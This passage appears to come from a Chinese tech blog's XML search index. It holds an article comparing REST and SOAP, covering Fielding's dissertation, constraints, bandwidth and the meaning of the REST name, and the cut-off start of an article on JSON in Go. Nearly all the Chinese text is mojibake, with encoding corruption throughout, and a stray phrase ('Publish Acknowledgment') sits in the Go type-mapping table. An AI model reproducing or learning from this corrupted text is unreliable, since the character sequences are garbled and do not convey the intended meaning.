RESTfulå‡ºç”Ÿåœ¨å­¦æœ¯ç•Œ,æœ‰ç€æ‹¥æŠ±å¼€æ”¾ç½‘ç»œçš„å“²å­¦,è€ŒSOAPæ˜¯å¤§å‹è½¯ä»¶å…¬å¸ä¸ºäº†è§£å†³ä¼ä¸šå¸‚åœºçš„éœ€è¦è€Œäº§å‡ºçš„ã€‚è™½ç„¶ç°åœ¨RESTç››è¡Œï¼Œä½†æ˜¯SOAPçš„ç¡®ä¹Ÿæœ‰ä»–çš„ä¼˜ç‚¹ï¼Œæ‰€æœ‰æˆ‘ä»¬éœ€è¦æ¯”è¾ƒè¿™ä¸¤ä¸ªåè®®ï¼Œåšæ­£ç¡®çš„å–èˆ. RESTfulç®€ä»‹RESTè¿™ä¸ªè¯ï¼Œæ˜¯Roy Thomas Fieldingåœ¨ä»–2000å¹´çš„åšå£«è®ºæ–‡ä¸­æå‡ºçš„ã€‚å®ƒæ˜¯â€œRepresentational State Transferâ€çš„ç¼©å†™ã€‚ä»–è¿™æ¬¡è®ºæ–‡çš„ä¸»é¢˜æ˜¯æ¢è®¨å‡ ç§åŸºäºç½‘ç»œçš„è½¯ä»¶è®¾è®¡æ¶æ„å’Œé£æ ¼ï¼Œ è€ŒRESTè¢«å…·ä½“æè¿°æ˜¯åœ¨ä»–è®ºæ–‡çš„ç¬¬5ç« ã€‚åœ¨è¿™ä¸ªç« èŠ‚ä¸­ï¼Œä»–æ˜¯è¿™æ ·æ€»ç»“RESTçš„: provides a set of architectural constraints that, when applied as a whole, emphasizes scalability of component interactions, generality of interfaces, independent deployment of components, and intermediary components to reduce interaction latency, enforce security, and encapsulate legacy systems. å®ƒæä¾›äº†ä¸€ç»„ä½“ç³»çº¦æŸï¼Œå…·ä½“æœ‰è¿™ä¹ˆå‡ ç‚¹: æ•´ä½“å…³è”æ€§ å¼ºè°ƒç»„ä»¶äº¤äº’çš„å¯ä¼¸ç¼©æ€§ ç»„ä»¶çš„ç‹¬ç«‹éƒ¨ç½² ä¸€èˆ¬æ€§çš„æ¥å£ ä½¿ç”¨ä¸­é—´ä»¶æ¥å‡å°‘äº¤æ¢å»¶è¿Ÿ æ‰§è¡Œå®‰å…¨ æ‰€ä»¥,RESTå¯ä»¥è¢«æè¿°ä¸ºä¸€ç§æ„å»ºWebæœåŠ¡æ‰€åº”è¯¥éµå¾ªçš„ä¸€ç»„ç‰¹å®šçº¦æŸ(providerå’Œcustomerä¹‹é—´çš„): client ç«¯å’Œserverç«¯çš„ å…³æ³¨ç‚¹çš„åˆ†ç¦»: clientä¸ç”¨å…³æ³¨ æ•°æ®çš„å­˜å‚¨ï¼Œ è€Œserverç«¯ä¸å¿…å…³æ³¨ç”¨æˆ·ç•Œé¢ã€‚ä½¿å¾—client å’Œ server è§£è€¦ï¼Œä»è€Œå–å¾—é«˜æ‰©å±•æ€§ å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡å¿…é¡»æ— çŠ¶æ€: æœåŠ¡å™¨ä¸åº”è¯¥å­˜å‚¨ä»»ä½• å’Œclientsä¹‹é—´äº¤äº’çš„ä¸Šä¸‹æ–‡ä¿¡æ¯, é™¤äº†ç”¨äºç»´æŠ¤è®¤è¯çš„ä¼šè¯ä¿¡æ¯ã€‚ å®¢æˆ·åº”è¯¥èƒ½å¤Ÿç¼“å­˜å“åº”: æ‰€æœ‰æœåŠ¡å™¨å“åº”åº”è¯¥åŒ…å«è¶³å¤Ÿçš„ç¼“å­˜ç›¸å…³çš„ä¿¡æ¯ã€‚å®¢æˆ·ç«¯å¯ä»¥ä¾é è¿™äº›ä¿¡æ¯å†³å®šæ˜¯å¦é€‚åˆç¼“å­˜å“åº”ã€‚ è¿æ¥å¯ä»¥å‘ç”Ÿåœ¨å¤šä¸ªé€šä¿¡å±‚: æœåŠ¡ç«¯ä¸åº”è¯¥åŒºåˆ† å®¢æˆ·ç«¯ æ˜¯å¦ç›´æ¥è¿æ¥serverï¼Œè¿˜æ˜¯é€šè¿‡ä¸­é—´ä»£ç†æ¥è¿æ¥server Fieldingæ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„äººï¼Œä»–æ˜¯HTTPåè®®ï¼ˆ1.0ç‰ˆå’Œ1.1ç‰ˆï¼‰çš„ä¸»è¦è®¾è®¡è€…ã€ApacheæœåŠ¡å™¨è½¯ä»¶çš„ä½œè€…ä¹‹ä¸€ã€ApacheåŸºé‡‘ä¼šçš„ç¬¬ä¸€ä»»ä¸»å¸­ã€‚æ‰€ä»¥ï¼Œä»–çš„è¿™ç¯‡è®ºæ–‡ä¸€ç»å‘è¡¨ï¼Œå°±å¼•èµ·äº†å…³æ³¨ï¼Œå¹¶ä¸”ç«‹å³å¯¹äº’è”ç½‘å¼€å‘äº§ç”Ÿäº†æ·±è¿œçš„å½±å“ã€‚ æ€»ä½“æ¥è¯´RESTå°±æ˜¯webçš„ä¸€ç§æŠ½è±¡ï¼ŒRESTåº”è¯¥å…è®¸ä»»ä½•customer ä»¥åŒä¸€ç§æ–¹å¼ä¸APIè¿›è¡Œäº¤äº’ï¼Œ è€Œä¸éœ€è¦çŸ¥é“å…¶åé¢çš„å·¥ä½œåŸç†ã€‚ SOAPç®€ä»‹SOAP, æ˜¯â€œSimple Object Access Protocolâ€çš„ç¼©å†™, æ˜¯1998å¹´ä¸€ç¾¤äººå’Œå¾®è½¯åˆä½œè€Œäº§ç”Ÿçš„ã€‚å…¶ä¸­çš„ä¸€ä¸ªäººå«æˆ´å¤«Â·ç»´çº³,ä»–æ˜¯XML-RPC(ä¸€ç§ä½¿ç”¨xmlä½œä¸º æ ‡å‡†çš„æ¶ˆæ¯è½½ä½“ çš„ è¿œç¨‹è¿‡ç¨‹è°ƒç”¨)çš„åˆ›é€ è€…, ä¹Ÿæ­£æ˜¯è¿™é¡¹åˆ›é€ å¯¼è‡´çš„SOAPçš„äº§ç”Ÿï¼Œå°½ç®¡è¢«å¾®è½¯,IBMå’Œå…¶ä»–å…¬å¸æ”¯æŒï¼Œä½†æ˜¯SOAPç›´åˆ°2003å¹´æ‰è¢«W3Cæ­£å¼æ‰¿è®¤ã€‚ ä½¿ç”¨SOAP WebæœåŠ¡ç¬¦åˆä¸€ç»„ç‰¹å¾ï¼Œä½¿åˆ†å¸ƒå¼å¯¹è±¡ä¹‹é—´çš„é€šä¿¡æˆä¸ºäº†å¯èƒ½: åè®®æ˜¯å¯æ‰©å±•çš„: æ‰©å±•çš„åŸºæœ¬åŠŸèƒ½å¯ä»¥æ„å»ºå’Œä½¿ç”¨è€Œä¸å½±å“ä¸»è¦ç‰¹å¾ æ¶ˆæ¯å†…å®¹åº”è¯¥ç‹¬ç«‹äºä¼ è¾“æœºåˆ¶: SOAPä¸ä»…å¯ä»¥é€šè¿‡HTTPä¼ è¾“æ¶ˆæ¯å†…å®¹ï¼Œè€Œä¸”å…¶ä»–ä¼ è¾“åè®®ä¹Ÿæ”¯æŒæ¯”å¦‚ï¼šSMTPã€‚SMTPè¢«ç”¨æ¥æä¾›å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„å¼‚æ­¥é€šä¿¡ã€‚ åº•å±‚ç¼–ç¨‹æ¨¡å‹è§£è€¦: åœ¨é€»è¾‘ä¸Š SOAPçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„å¼€å‘æ—¶å®Œå…¨ç‹¬ç«‹çš„ã€‚ SAOPåœ¨ä»–åˆšå‡ºä¸–çš„å‰å‡ å¹´ï¼Œéå¸¸ç››è¡Œï¼Œä½†æ˜¯éšåä¸€ç›´èµ°ä¸‹å¡è·¯ï¼Œä½†æ˜¯SAOPç°åœ¨ä»ç„¶åˆ«ä¸€äº›ä¼ä¸šçº§çš„ç¯å¢ƒä½¿ç”¨ç€ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ä¼ä¸šçº§çš„éœ€æ±‚é‡Œé¢,ä¸åŒæœåŠ¡ä¹‹é—´çš„é€šä¿¡éœ€è¦éµå¾ªä¸€å¥—è§„åˆ™å’Œçº¦æŸã€‚æ­£æ˜¯å› ä¸ºå®ƒéµå¾ªå¯¹è±¡ã€è§„åˆ™å’Œçº¦æŸ,æ‰€ä»¥SOAPæ˜¯ä¸€ä¸ªæ¯”RESTæ›´ä¸¥æ ¼çš„åè®®ã€‚ SOAPåœ¨è¾ƒå¤§çš„ç»„ç»‡ä¸­èµ¢å¾—äº†æ”¯æŒ,ä¸»è¦åŸå› æ˜¯å½“æ—¶å¾®è½¯çš„æ”¯æŒï¼Œä»¥åŠå¸‚åœºç”±å¾®è½¯ä¸»å¯¼ã€‚Windows Communication Foundation(WCF),ä»¥å¾®è½¯å¹³å°ä½œä¸ºæ ¸å¿ƒå¼€å‘, ç›´åˆ°ä»Šå¤©ä»ç„¶æ”¯æŒSOAPï¼Œ è€Œå…¶ä»–æ–¹å¼å®ç°çš„SAOPçš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ¡†æ¶æœ‰PHP Zend Frameworkå’ŒApache CXF REST vs SOAP è®¾è®¡å“²å­¦SOAPä¸»è¦æ˜¯æä¾›äº†ä¸€ç§è¿œç¨‹è®¿é—®å’Œæ“ä½œå¯¹è±¡çš„æ–¹å¼ï¼Œè€ŒRESTåˆ™å…³æ³¨èµ„æºå¯ä»¥è¢«æ‰§è¡Œçš„æ“ä½œã€‚ç”±æ­¤å¯è§SAOPæ›´å…³æ³¨åŠŸèƒ½ï¼Œè€ŒRESTæ›´å…³æ³¨èµ„æºï¼Œè¿™ä¸»è¦ä¸ä»–ä»¬çš„è®¾è®¡å“²å­¦å’Œå‡ºç”Ÿæœ‰å…³(å‰é¢å·²ç»æåŠ), æ­£æ˜¯ç”±äºè¿™äº›åŒºåˆ«ï¼ŒRESTä¸»è¦è¢«ç”¨æ¥è®¾è®¡æš´éœ²äºäº’è”ç½‘çš„å…¬ç½‘APIï¼Œè€Œç”±äºRESTç»§æ‰¿äº†HTTPçš„æ“ä½œï¼Œæ›´ä½¿å¾—å®ƒæˆä¸ºæ„å»ºå¼€æ”¾çš„WEB APIçš„ä¸äºŒä¹‹é€‰ã€‚ äº’è”ç½‘å…¬å¸æ”¯æŒRESTfulå¾ˆæµè¡Œçš„ä¸€ä¸ªä¸»è¦åŸå› æ˜¯äº’è”ç½‘å·¨å¤´çš„ä½¿ç”¨ï¼Œä»¥åŠè¿™äº›äº’è”ç½‘å·¨å¤´çš„é¼“åŠ±å’Œæ¨è å¸¦å®½æ¶ˆè€—åœ¨ä½ ä¸éœ€è¦å°†ä¸€ç»„å¯¹è±¡å…¨æ˜ å°„ç»™å®¢æˆ·ç«¯çš„åœºæ™¯ä¸­ï¼Œ RESTæ°¸è¿œéƒ½è¦ä¼˜äºSOAPï¼Œ è€Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œ å®Œå…¨æ²¡æœ‰å¿…è¦å°†æœåŠ¡å™¨ç«¯çš„ä¸€ç»„å¯¹è±¡å…¨æ˜ å°„ç»™å®¢æˆ·ç«¯ã€‚è€Œå¯¹è±¡çš„æ¥å›æ˜ å°„æ˜¯æå…·æ¶ˆè€—å¸¦å®½çš„ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºå•¥è¯´SOAPæ¯”è¾ƒé‡çš„åŸå› æ‰€åœ¨ã€‚ æ‰€ä»¥å°½é‡é¿å…ä½¿ç”¨SOAPï¼Œ ç‰¹åˆ«æ˜¯å½“ä½ çš„å¸¦å®½èµ„æºéå¸¸çè´µçš„æƒ…å½¢ä¸‹ï¼Œæ¯”å¦‚ç§»åŠ¨app æ˜“ç”¨æ€§è¿™æ˜¯æœ€é‡è¦çš„åŸå› , RESTæ¯”SOAPç®€å•, å­¦ä¹ å’Œä½¿ç”¨RESTful APIçš„ä»£ä»·æä½ï¼Œè¿™ä½¿å¾—å¼€å‘RESTfulAPIçš„æ—¶é—´ä¸Šæ¯”SOAPçŸ­ã€‚RESTfulé€šè¿‡HTTPçš„æ–¹æ³•æ¥æ“ä½œèµ„æºï¼Œé€šè¿‡jsonæ¥äº¤æ¢æ•°æ®ï¼Œ æ— è®ºæ˜¯HTTPåè®®ä¸Šçš„ä½¿ç”¨ç®€å•(request url and get response), è¿˜æ˜¯æ•°æ®äº¤æ¢æ ¼å¼Jsonçš„æµè¡Œï¼Œå½“ç„¶Jsonçš„æµè¡Œä¸»è¦æ˜¯å› ä¸ºjavascript, éƒ½ä½¿å¾—RESTæ¯”SOAPæ›´æ˜“äºè¢«äººä»¬æ¥æ”¶å’Œä½¿ç”¨ã€‚ æ•æ·æ€§ç”±äºRESTè½»çº¦æŸ(è¿™ä¸ªä¸»è¦æ˜¯æ— çŠ¶æ€çš„è®¾è®¡)ï¼Œ è€ŒSOAPé‡çº¦æŸï¼Œ ä½¿å¾—RESTæ›´åŠ çµæ´»ï¼Œå½“WEB APIæœ‰å˜åŒ–æ—¶ ä¼ä¸šå¯ä»¥å¿«é€Ÿçš„é€‚ç”¨ã€‚ æ·±å…¥RESTfulåœ¨å¯¹RESTfulçš„å‰ä¸–ä»Šç”Ÿï¼Œ ä»¥åŠå¦‚ä½•PKæ‰SOAPçš„ äº†è§£ä¸‹ï¼Œ RESTfulçš„å…·ä½“æ¦‚å¿µ ä¹Ÿå°±æ¯”è¾ƒå¥½ç†è§£äº†ï¼Œ å¦‚æœæ›´æ·±å…¥äº†è§£RESTfulçš„æ¦‚å¿µï¼Œå¯è§å‚è€ƒåé¢Fieldingçš„åšå£«ç”Ÿè®ºæ–‡ç¬¬5ç« ï¼Œæ–‡ç« æœ€åæœ‰è¿æ¥ã€‚ åç§°åç§°å¾€å¾€éƒ½éå¸¸é‡è¦, å› ä¸ºå®ƒæ˜¯å¯¹è¿™ä¸ªäº‹ç‰©çš„é«˜åº¦æŠ½è±¡,æ¯”å¦‚Docker, ä»–çš„è‹±æ–‡æ„è¯†æ˜¯ç å¤´çš„æ¬è¿å·¥ï¼Œè€ŒDockerçœŸæ­£çš„ç”¨é€”æ˜¯è½¯ä»¶çš„æ¬è¿å·¥ï¼Œæ‰€ä»¥æ˜¯ä¸æ˜¯å¾ˆæœ‰æ„æ€ã€‚Fieldingå°†ä»–å¯¹äº’è”ç½‘è½¯ä»¶çš„æ¶æ„åŸåˆ™ï¼Œå®šåä¸ºRESTï¼Œå³Representational State Transferçš„ç¼©å†™ã€‚è¿™ä¸ªè¯ç»„çš„ç¿»è¯‘æ˜¯â€è¡¨ç°å±‚çŠ¶æ€è½¬åŒ–â€ã€‚å› æ­¤è¦ç†è§£RESTfulåˆ°åº•æ˜¯ä¸€ç§å•¥æ ·çš„äº’è”ç½‘è½¯ä»¶è®¾è®¡é£æ ¼ï¼Œç†è§£å¥½Representational State Transfer è¿™ç»„å•è¯æ˜¯ç¬¬ä¸€æ­¥ã€‚ è¿™å•è¯ä¸­åŒ…å«äº†é‚£äº›ä¿¡æ¯å–ƒ? RESTçš„åç§°â€è¡¨ç°å±‚çŠ¶æ€è½¬åŒ–â€ä¸­ï¼Œçœç•¥äº†ä¸»è¯­ã€‚â€è¡¨ç°å±‚â€å…¶å®æŒ‡çš„æ˜¯â€èµ„æºâ€(Resources)çš„â€è¡¨ç°å±‚â€ã€‚å› æ­¤å°±æœ‰3ä¸ªè¦ç´ ï¼šèµ„æºã€è¡¨ç°ã€è½¬æ¢. Resource(èµ„æº)æ‰€è°“â€èµ„æºâ€ï¼Œå°±æ˜¯ç½‘ç»œä¸Šçš„ä¸€ä¸ªå®ä½“ï¼Œæˆ–è€…è¯´æ˜¯ç½‘ç»œä¸Šçš„ä¸€ä¸ªå…·ä½“ä¿¡æ¯ã€‚å®ƒå¯ä»¥æ˜¯ä¸€æ®µæ–‡æœ¬ã€ä¸€å¼ å›¾ç‰‡ã€ä¸€é¦–æ­Œæ›²ã€ä¸€ç§æœåŠ¡ï¼Œæ€»ä¹‹å°±æ˜¯ä¸€ä¸ªå…·ä½“çš„å®åœ¨ã€‚ä½ å¯ä»¥ç”¨ä¸€ä¸ªURI(ç»Ÿä¸€èµ„æºå®šä½ç¬¦)æŒ‡å‘å®ƒï¼Œæ¯ç§èµ„æºå¯¹åº”ä¸€ä¸ªç‰¹å®šçš„URIã€‚è¦è·å–è¿™ä¸ªèµ„æºï¼Œè®¿é—®å®ƒçš„URIå°±å¯ä»¥ï¼Œå› æ­¤URIå°±æˆäº†æ¯ä¸€ä¸ªèµ„æºçš„åœ°å€æˆ–ç‹¬ä¸€æ— äºŒçš„è¯†åˆ«ç¬¦ã€‚ äººä»¬å¾€å¾€å®¹æ˜“æŠŠRUIå’ŒURLææ··ï¼Œå®é™…ä¸Šä»–ä»¬çš„ç¡®æ˜¯æŒ‡åŒä¸€ç§äº‹ç‰©(èµ„æº), åªæ˜¯ç«™çš„è§’åº¦ä¸åŒ, è€Œå«æ³•ä¸åŒè€Œå·²: ç«™åœ¨å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬å«è®¿é—®èµ„æºçš„è·¯å¾„å«URL, ç«™åœ¨æœåŠ¡å™¨ æˆ‘ä»¬å®šä¹‰èµ„æºçš„è·¯å¾„å« RUI è€Œæ•´ä¸ªäº’è”ç½‘ å°±æ˜¯ç”±è¿™äº›èµ„æºç»„åˆè€Œæˆçš„. Representational(è¡¨ç°å±‚)â€œèµ„æºâ€æ˜¯ä¸€ç§ä¿¡æ¯å®ä½“, å®ƒå¯ä»¥æœ‰å¤šç§å¤–åœ¨è¡¨ç°å½¢å¼. æˆ‘ä»¬æŠŠâ€èµ„æºâ€å…·ä½“å‘ˆç°å‡ºæ¥çš„å½¢å¼, å«åšå®ƒçš„è¡¨ç°å±‚(Representation).æ¯”å¦‚ï¼Œæ–‡æœ¬å¯ä»¥ç”¨txtæ ¼å¼è¡¨ç°ï¼Œä¹Ÿå¯ä»¥ç”¨HTMLæ ¼å¼ã€XMLæ ¼å¼ã€JSONæ ¼å¼è¡¨ç°ï¼Œç”šè‡³å¯ä»¥é‡‡ç”¨äºŒè¿›åˆ¶æ ¼å¼ï¼›å›¾ç‰‡å¯ä»¥ç”¨JPGæ ¼å¼è¡¨ç°ï¼Œä¹Ÿå¯ä»¥ç”¨PNGæ ¼å¼è¡¨ç°ã€‚ URIåªä»£è¡¨èµ„æºçš„å®ä½“ï¼Œä¸ä»£è¡¨å®ƒçš„å½¢å¼ã€‚ä¸¥æ ¼åœ°è¯´ï¼Œæœ‰äº›ç½‘å€æœ€åçš„â€.htmlâ€åç¼€åæ˜¯ä¸å¿…è¦çš„ï¼Œå› ä¸ºè¿™ä¸ªåç¼€åè¡¨ç¤ºæ ¼å¼, å±äºè¡¨ç°å±‚èŒƒç•´ï¼Œè€ŒURIåº”è¯¥åªä»£è¡¨èµ„æºçš„ä½ç½®ã€‚å®ƒçš„å…·ä½“è¡¨ç°å½¢å¼ï¼Œåº”è¯¥åœ¨HTTPè¯·æ±‚çš„å¤´ä¿¡æ¯ä¸­ç”¨Acceptå’ŒContent-Typeå­—æ®µæŒ‡å®šï¼Œè¿™ä¸¤ä¸ªå­—æ®µæ‰æ˜¯å¯¹è¡¨ç°å±‚çš„æè¿°ã€‚ State Transfer(çŠ¶æ€è½¬æ¢)è®¿é—®ä¸€ä¸ªç½‘ç«™, å°±ä»£è¡¨äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„ä¸€ä¸ªäº’åŠ¨è¿‡ç¨‹ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒåŠ¿å¿…æ¶‰åŠåˆ°æ•°æ®å’ŒçŠ¶æ€çš„å˜åŒ–ã€‚ äº’è”ç½‘é€šä¿¡åè®®HTTPåè®®, æ˜¯ä¸€ä¸ªæ— çŠ¶æ€åè®®ã€‚è¿™æ„å‘³ç€, æ‰€æœ‰çš„çŠ¶æ€éƒ½ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ã€‚å› æ­¤, å¦‚æœå®¢æˆ·ç«¯æƒ³è¦æ“ä½œæœåŠ¡å™¨, å¿…é¡»é€šè¿‡æŸç§æ‰‹æ®µè®©æœåŠ¡å™¨ç«¯å‘ç”ŸçŠ¶æ€è½¬åŒ–(State Transfer). è€Œè¿™ç§è½¬åŒ–æ˜¯å»ºç«‹åœ¨è¡¨ç°å±‚ä¹‹ä¸Šçš„ï¼Œæ‰€ä»¥å°±æ˜¯â€è¡¨ç°å±‚çŠ¶æ€è½¬åŒ–â€ã€‚ å®¢æˆ·ç«¯ç”¨åˆ°çš„æ‰‹æ®µï¼Œåªèƒ½æ˜¯HTTPåè®®ã€‚å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯HTTPåè®®é‡Œé¢ï¼Œå››ä¸ªè¡¨ç¤ºæ“ä½œæ–¹å¼çš„åŠ¨è¯ï¼šGETã€POSTã€PUTã€DELETEã€‚å®ƒä»¬åˆ†åˆ«å¯¹åº”å››ç§åŸºæœ¬æ“ä½œï¼šGETç”¨æ¥è·å–èµ„æºï¼ŒPOSTç”¨æ¥æ–°å»ºèµ„æºï¼ˆä¹Ÿå¯ä»¥ç”¨äºæ›´æ–°èµ„æºï¼‰ï¼ŒPUTç”¨æ¥æ›´æ–°èµ„æºï¼ŒDELETEç”¨æ¥åˆ é™¤èµ„æºã€‚ å‚è€ƒæ–‡æ¡£ RESTful tutorial REST vs SOAP é˜®ä¸€å³°åšå®¢ Fieldingè®ºæ–‡å¯¹RESTfulå…·ä½“æè¿°]]></content>
      <categories>
        <category>ç¨‹åºè®¾è®¡</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>restful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Goè¯­è¨€JSONè¯¦è§£]]></title>
    <url>%2F2017%2F10%2F03%2Fgolang-json%2F</url>
    <content type="text"><![CDATA[ç›®å‰æˆ‘ä»¬çœ‹åˆ°å¾ˆå¤šçš„å¼€æ”¾å¹³å°ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯é‡‡ç”¨äº†JSONä½œä¸ºä»–ä»¬çš„æ•°æ®äº¤äº’çš„æ ¼å¼ã€‚æ—¢ç„¶JSONåœ¨Webå¼€å‘ä¸­å¦‚æ­¤é‡è¦ï¼Œé‚£ä¹ˆGoè¯­è¨€å¯¹JSONæ”¯æŒçš„æ€ä¹ˆæ ·å‘¢ï¼ŸGoè¯­è¨€çš„æ ‡å‡†åº“å·²ç»éå¸¸å¥½çš„æ”¯æŒäº†JSONï¼Œå¯ä»¥å¾ˆå®¹æ˜“çš„å¯¹JSONæ•°æ®è¿›è¡Œç¼–ã€è§£ç çš„å·¥ä½œã€‚å¦‚æœæœ‰æ›´çµæ´»çš„éœ€æ±‚ä¹Ÿæœ‰ä¸é”™çš„ç¬¬ä¸‰æ–¹åº“æä¾›æ”¯æŒã€‚è¿™ç¯‡æ–‡ç« å°†å…¨é¢è§£è¯»Golangä¸­JSONçš„ä½¿ç”¨ã€‚ JSONç®€ä»‹JSONï¼ˆJavascript Object Notationï¼‰æ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®äº¤æ¢è¯­è¨€ï¼Œä»¥æ–‡å­—ä¸ºåŸºç¡€ï¼Œå…·æœ‰è‡ªæˆ‘æè¿°æ€§ä¸”æ˜“äºè®©äººé˜…è¯»ã€‚å°½ç®¡JSONæ˜¯Javascript Standard ECMA-262 3rd Edition â€“ December 1999çš„ä¸€ä¸ªå­é›†ï¼Œä½†JSONæ˜¯ç‹¬ç«‹äºè¯­è¨€çš„æ–‡æœ¬æ ¼å¼ï¼Œå¹¶ä¸”é‡‡ç”¨äº†ç±»ä¼¼äºCè¯­è¨€å®¶æ—çš„ä¸€äº›ä¹ æƒ¯, è¿™äº›ç‰¹æ€§ä½¿JSONæˆä¸ºç†æƒ³çš„æ•°æ®äº¤æ¢è¯­è¨€ã€‚ JSONä¸XMLæœ€å¤§çš„ä¸åŒåœ¨äºXMLæ˜¯ä¸€ä¸ªå®Œæ•´çš„æ ‡è®°è¯­è¨€ï¼Œè€ŒJSONä¸æ˜¯ã€‚JSONç”±äºæ¯”XMLæ›´å°ã€æ›´å¿«ï¼Œæ›´æ˜“è§£æ,ä»¥åŠæµè§ˆå™¨çš„å†…å»ºå¿«é€Ÿè§£ææ”¯æŒ,ä½¿å¾—å…¶æ›´é€‚ç”¨äºç½‘ç»œæ•°æ®ä¼ è¾“é¢†åŸŸã€‚ åœ¨è®²è§£JSONçš„æ•°æ®ç»“æ„ä¹‹å‰, æˆ‘ä»¬å…ˆæ¥ä¸€æ®µç®€å•çš„æ ·ä¾‹JSONæ•°æ®:12345678910111213141516171819202122[ &#123; "precision": "zip", "Latitude": 37.7668, "Longitude": -122.3959, "Address": "", "City": "SAN FRANCISCO", "State": "CA", "Zip": "94107", "Country": "US" &#125;, &#123; "precision": "zip", "Latitude": 37.371991, "Longitude": -122.026020, "Address": "", "City": "SUNNYVALE", "State": "CA", "Zip": "94085", "Country": "US" &#125;] JSONå»ºæ„äºä¸¤ç§ç»“æ„: é”®å€¼å¯¹çš„é›†åˆ(A collection of name/value pairs): åœ¨ä¸åŒçš„è¯­è¨€ä¸­, ä»–ä»¬è¢«ç†è§£ä¸º: object(Javascript), struct(Golang), Dictinary(Python), ä»¥åŠå“ˆå¸Œè¡¨(hash table), æœ‰é”®åˆ—è¡¨(keyed list), æˆ–è€…å…³è”æ•°ç»„(associative array). å€¼çš„æœ‰åºåˆ—è¡¨(An ordered list of values): åœ¨å¤§éƒ¨åˆ†è¯­è¨€ä¸­ï¼Œå®ƒè¢«ç†è§£ä¸ºæ•°ç»„(array). å…¶ä¸­å€¼å¯ä»¥åŒ…å«å¦‚ä¸‹ç±»å‹, å¹¶ä¸”è¿™äº›ç»“æ„å¯ä»¥åµŒå¥—: å­—ç¬¦ä¸²(string): ç”±åŒå¼•å·åŒ…å›´çš„ä»»æ„æ•°é‡Unicodeå­—ç¬¦çš„é›†åˆï¼Œä½¿ç”¨åæ–œçº¿è½¬ä¹‰, ä¸€ä¸ªå­—ç¬¦(character)å³ä¸€ä¸ªå•ç‹¬çš„å­—ç¬¦ä¸²(character string) æ•°å€¼(number): åŒæ—¶åŒ…å«æ•´æ•°å’Œæµ®ç‚¹æ•° å¸ƒå°”å€¼(booleans): å¸ƒå°”å€¼åŒ…å«: trueå’Œfalse ç©º(null): ç©º å¯¹è±¡(object): é”®å€¼å¯¹çš„é›†åˆ æ•°ç»„(array): å€¼çš„æœ‰åºåˆ—è¡¨ è¿™äº›éƒ½æ˜¯å¸¸è§çš„æ•°æ®ç»“æ„ã€‚äº‹å®ä¸Šå¤§éƒ¨åˆ†ç°ä»£è®¡ç®—æœºè¯­è¨€éƒ½ä»¥æŸç§å½¢å¼æ”¯æŒå®ƒä»¬ã€‚è¿™ä½¿å¾—ä¸€ç§æ•°æ®æ ¼å¼åœ¨åŒæ ·åŸºäºè¿™äº›ç»“æ„çš„ç¼–ç¨‹è¯­è¨€ä¹‹é—´äº¤æ¢æˆä¸ºå¯èƒ½ã€‚ JSONä¸Goæ•°æ®ç»“æ„æ˜ å°„JSONæ ¼å¼å¯ä»¥ç®—æˆ‘ä»¬æ—¥å¸¸æœ€å¸¸ç”¨çš„åºåˆ—åŒ–æ ¼å¼ä¹‹ä¸€äº†, Goè¯­è¨€ä½œä¸ºä¸€ä¸ªç”±Googleå¼€å‘, å·ç§°äº’è”ç½‘çš„Cè¯­è¨€çš„è¯­è¨€, è‡ªç„¶ä¹Ÿå¯¹JSONæ ¼å¼æ”¯æŒå¾ˆå¥½ã€‚Golangçš„æ ‡å‡†åº“encoding/jsonå®ç°çš„JSONæ ‡å‡†(RFC 4627)çš„ç¼–ç å’Œè§£ç , å¯ä»¥è®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿åœ°è¿›è¡ŒJSONæ•°æ®çš„è½¬æ¢. å…·ä½“è¯¦æƒ…å¯ä»¥å‚è€ƒæ ‡å‡†åº“Marshalå’ŒUnmarshalå‡½æ•°çš„æ³¨é‡Š, ä¸‹é¢æ˜¯ä¸€ä¸ªåŸºæœ¬çš„æ•°æ®å…³ç³»æ˜ å°„æ€»ç»“: Golang Type JSON Type Description bool booleans true or false int, float numbers å¯¹äºgolangæ‰€æœ‰çš„æ•°å€¼ç±»å‹ string strings å­—ç¬¦ä¸²ä¼šè½¬æ¢æˆUTF-8è¿›è¡Œè¾“å‡ºï¼Œæ— æ³•è½¬æ¢çš„ä¼šæ‰“å°å¯¹åº”çš„unicodeå€¼ã€‚è€Œä¸”ä¸ºäº†é˜²æ­¢æµè§ˆå™¨æŠŠjsonè¾“å‡ºå½“åšhtmlï¼Œ â€œ&lt;â€ã€â€&gt;â€ ä»¥åŠ â€œ&amp;â€ ä¼šè¢«è½¬ä¹‰ä¸º â€œ\u003câ€ã€â€\u003eâ€ å’Œ â€œ\u0026â€ array,slice arrays Publish Acknowledgment struct objects åªæœ‰å¯¼å‡ºçš„å­—æ®µ(ä»¥å¤§å†™å­—æ¯å¼€å¤´)æ‰ä¼šåœ¨è¾“å‡ºä¸­ nil null ç©º Goè¯­è¨€æ˜¯ä¸ªå¼ºç±»å‹è¯­è¨€ï¼Œå¯¹æ ¼å¼è¦æ±‚æå…¶ä¸¥æ ¼è€ŒJSONæ 